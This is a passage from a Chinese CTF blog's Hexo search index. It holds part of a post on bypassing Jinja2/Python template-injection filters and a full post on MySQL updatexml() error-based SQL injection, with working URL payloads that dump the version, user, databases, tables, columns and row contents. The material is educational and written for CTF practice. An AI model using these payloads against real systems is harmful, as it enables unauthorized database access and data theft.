class="string">''</span>.__class__</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>用<code>attr()</code>函数来代替</p><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'__class'</span>__]等价于<span class="string">''</span>|attr(<span class="string">'__class__'</span>)</span><br></pre></td></tr></table></figure></li></ol><h6 id="4-关键词字符过滤"><a href="#4-关键词字符过滤" class="headerlink" title="4)关键词字符过滤"></a>4)关键词字符过滤</h6><ol><li><p>利用字符串特性将关键词拆绕过。</p><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'__cl'</span>+<span class="string">'ass__'</span>]等价于<span class="string">''</span>.__class__</span><br><span class="line"><span class="comment">#（PS：在url中'+'号最好要编码成%2b！！！）</span></span><br><span class="line"><span class="string">''</span>.__getattribute__(<span class="string">'__cla'</span>+<span class="string">'ss__'</span>)</span><br><span class="line"><span class="comment">#（PS：在url中'+'号最好要编码成%2b！！！）</span></span><br></pre></td></tr></table></figure></li><li><p>在<code>dir()</code>或<code>__dir__()</code>没有被ban下利用<code>dir()</code>或<code>__dir__()</code>返回值进行拼接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">''</span>.__dir__()[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">''</span>.__dir__()[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">''</span>.__dir__()[<span class="number">18</span>][<span class="number">2</span>]+<span class="string">''</span>.__dir__()[<span class="number">4</span>][<span class="number">2</span>]+<span class="string">''</span>.__dir__()[<span class="number">1</span>][<span class="number">3</span>]+<span class="string">''</span>.__dir__()[<span class="number">2</span>][<span class="number">2</span>]+<span class="string">''</span>.__dir__()[<span class="number">2</span>][<span class="number">2</span>]+<span class="string">''</span>.__dir__()[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">''</span>.__dir__()[<span class="number">0</span>][<span class="number">0</span>]]</span><br><span class="line"><span class="comment">#在我的环境中，等价于__class__</span></span><br><span class="line"><span class="comment">#''.__dir__()[0][0]=='_'</span></span><br><span class="line"><span class="comment">#''.__dir__()[18][2]==‘c’</span></span><br><span class="line"><span class="comment">#''.__dir__()[4][2]=='a'</span></span><br><span class="line"><span class="comment">#''.__dir__()[1][3]=='l'</span></span><br><span class="line"><span class="comment">#''.__dir__()[2][2]=='s'</span></span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>‘%c’.format()与’{0:c}’.format()拼接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>[<span class="string">'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">99</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">108</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">97</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">115</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">115</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)]&#125;&#125;等价于<span class="string">''</span>.__class__</span><br><span class="line"><span class="comment">#（PS：在url中'+'号最好要编码成%2b！！！）</span></span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>进行编码绕过。用<strong>getattribute</strong>进行实例访问属性时,对想要绕过关键词进行编码处理</p><p>例；进行base64处理<code>__class__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__getattribute__(<span class="string">'X19jbGFzc19f'</span>.decode(<span class="string">'base64'</span>))</span><br></pre></td></tr></table></figure><p>同理还可以进行rot13、16进制编码等.</p></li></ol><h6 id="5-过滤了‘-’or‘-’"><a href="#5-过滤了‘-’or‘-’" class="headerlink" title="5)过滤了‘{ {’or‘} }’"></a>5)过滤了‘{ {’or‘} }’</h6><p>可以用<code>{ % % }</code>来代替<code>{ {} }</code>，但要注意两者区别： <code>{ {} }</code>是用来变量取值，<code>{ { % % } }</code>是用来控制结构。 </p><h2 id="0x0参考文献"><a href="#0x0参考文献" class="headerlink" title="0x0参考文献"></a>0x0参考文献</h2><p>1.<a href="https://blog.csdn.net/answer3lin/article/details/86572575" target="_blank" rel="noopener">https://blog.csdn.net/answer3lin/article/details/86572575</a></p><p>2.<a href="https://docs.python.org/zh-cn/3/" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/</a></p><p>3.<a href="https://www.anquanke.com/post/id/188172#h3-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188172#h3-2</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于updatexml()报错注入的思考</title>
      <link href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01updatexml-的正常作用"><a href="#0x01updatexml-的正常作用" class="headerlink" title="0x01updatexml()的正常作用"></a>0x01updatexml()的正常作用</h2><p>updatexml()是MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数。<a id="more"></a>其正常语法：<br><code>UPDATEXML (XML_document, XPath_string, new_value);</code><br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p><p>如下是关于它正常用法的掩饰。</p><p>(1)执行如下sql语言创建环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE  xml1 (xxx VARCHAR(150));#创建一个表</span><br><span class="line">INSERT INTO xml1 VALUES</span><br><span class="line">(&#39;</span><br><span class="line">&lt;values&gt; </span><br><span class="line">&lt;name&gt;lexsd6&lt;&#x2F;name&gt;</span><br><span class="line">&lt;text&gt;frist xml date&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;values&gt;&#39;);#插入第一个数据</span><br><span class="line">INSERT INTO xml1 VALUES</span><br><span class="line">(&#39;</span><br><span class="line">&lt;values&gt; </span><br><span class="line">&lt;name&gt;lexs&lt;&#x2F;name&gt;</span><br><span class="line">&lt;text&gt;secend xml date&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;values&gt;&#39;);#插入第二个数据</span><br></pre></td></tr></table></figure><p>(2) 使用<code>select * from xml1</code>查看</p><p><img src="iamge-updatexml1.png" alt="updatexml1"></p><p>（3）执行<code>SELECT updatexml(title,&#39;/values/text&#39;,&#39;one&#39;) FROM xml1;</code>语句。发现执行后，原来有<text>标签的地方连同标签里的内容都被替换成了‘one’。</p><p><img src="image-20200320235648716.png" alt="image-20200320235648716"></p><h2 id="0x02updatexml-报错注入的原因及注意点"><a href="#0x02updatexml-报错注入的原因及注意点" class="headerlink" title="0x02updatexml()报错注入的原因及注意点"></a>0x02updatexml()报错注入的原因及注意点</h2><p>由于updatexml的第二个参数需要<u><strong>Xpath</strong></u>格式的字符串,但如果在提交的不符合和Xpath格式,会用报错的形式将执行后的结果回显出了来.</p><p>例如:执行sql语句<code>select updatexml(1,concat(0x7e,(select database()),0x7e),1);</code>后,可以看到回显:</p><p><img src="image-20200321131351700.png" alt="image-20200321131351700"></p><p>如上图,原本<code>select database()</code>的地方被执行了,显示出数据库名–bookshop.</p><p>在这里要注意的事：</p><p>(1.)由于updatexml的保错回显只能返回一个属性，所以如果一个表中用多行，需要用‘limit’来限制行数（元组数）为一。</p><p>(2.)在构建第二个参数时，要确保第二个参数不符合Xpath格式。有的函数符合Xpath格式可以用concat(‘不符合Xpath格式的字符串’,’要执行的恶意sql语句’)来构造’’</p><p><img src="image-20200321002711168.png" alt="image-20200321002711168"></p><p>(3.)若要注入出的数据格式就是xml结构的数据则可以直接在第二个参数select:</p><p><img src="image-20200321160707020.png" alt="image-20200321160707020"></p><p>(4.)用这个方法注出来的数据有长度限制。且在恶意代码前的参数字符越多，注出的有效信息越少。（如下图）.</p><p><img src="image-20200321161640552.png" alt="image-20200321161640552"></p><p>so在有一张表有多行时最好用limit 一行一行查询,慎重使用group_concat函数.(group_concat可能显示不全,用substr来截取拼接)</p><p><img src="image-20200324151215694.png" alt="image-20200324151215694"></p><h2 id="0x03updatexml-的注入"><a href="#0x03updatexml-的注入" class="headerlink" title="0x03updatexml()的注入"></a>0x03updatexml()的注入</h2><p>(1.)爆数据库版本信息</p><p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) ;#</p><p>(2.)爆出用户</p><p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)  ;#</p><p>(3.)爆出所用数据库</p><p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) ；#</p><p>(4.)爆全部数据库</p><p><a href="http://www.hackblog.cn/sql.php?id=1" target="_blank" rel="noopener">http://www.hackblog.cn/sql.php?id=1</a> and uand  updatexml(1,concat(0x7e,(SELECT schema_name from information_schema.SCHEMATA  limit 0,1),0x7e),1);#</p><p>(5.)爆表<br><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1);#</p><p>(6.)爆字段</p><p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_name=’xml1’ limit 0,1),0x7e),1);#</p><p>(7.)爆字段内容<br><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and  updatexml(1,concat(0x7e,(SELECT  title from xml1 limit 0,1),0x7e),1);#</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/10/03/hello-world/"/>
      <url>/2019/10/03/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
